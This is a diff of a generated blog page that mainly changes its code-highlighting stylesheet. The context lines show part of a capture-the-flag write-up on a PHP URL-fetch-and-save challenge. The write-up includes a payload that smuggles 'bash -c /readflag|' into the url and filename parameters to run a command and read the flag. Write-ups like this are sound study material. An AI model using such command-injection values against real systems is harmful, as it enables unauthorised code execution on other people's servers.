@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -245,7 +253,7 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+              <h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;
         $http_x_headers = explode(<span class="hljs-string">&#x27;,&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);    <span class="hljs-comment">##以逗号分割$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]，返回数组</span>
         $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $http_x_headers[<span class="hljs-number">0</span>];
@@ -263,7 +271,7 @@
     @mkdir($dir);
     @chdir($dir);
     @file_put_contents(basename($info[<span class="hljs-string">&quot;basename&quot;</span>]), $data);
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);</code></pre></div></code></pre>
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);</code></pre></code></pre>
 <p>读取根目录，创建文件abc<br><code>url=/&amp;filename=abc</code><br>访问该文件<code>/sandbox/fcf2bccafc269c160382150a0166d632/abc    </code><br> <img src="https://ae03.alicdn.com/kf/U9d258cc946ec4e4fb723d7652f2049c7P.jpg" srcset="/img/loading.gif" alt="01.png"></p>
 <p>/readflag得到flag       </p>
 <p><code>bash -c /readflag|</code><br>不过要先有一个同名文件<br>然后执行该命令<br>payload：<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code>执行两遍，然后访问<code>bash -c /readflag|</code>即可得到flag       </p>
@@ -412,6 +420,8 @@
 
 
 
+  
+    
   
 
 
